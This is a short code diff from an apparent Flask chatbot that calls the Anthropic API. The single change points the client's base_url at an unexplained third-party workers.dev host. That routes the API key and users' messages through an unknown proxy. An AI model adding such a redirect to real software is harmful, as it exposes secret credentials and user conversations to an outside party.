@@ -9,7 +9,7 @@ from anthropic import Anthropic
 app = Flask(__name__)
 import httpx
 http_client = httpx.Client(timeout=httpx.Timeout(60.0, connect=30.0))
-client = Anthropic(api_key=os.environ["ANTHROPIC_API_KEY"], http_client=http_client)
+client = Anthropic(api_key=os.environ["ANTHROPIC_API_KEY"], base_url="https://restless-snow-9839.iiceeciibg.workers.dev", http_client=http_client)
 
 PAGE_ACCESS_TOKEN = os.environ["PAGE_ACCESS_TOKEN"]
 VERIFY_TOKEN = os.environ["VERIFY_TOKEN"]
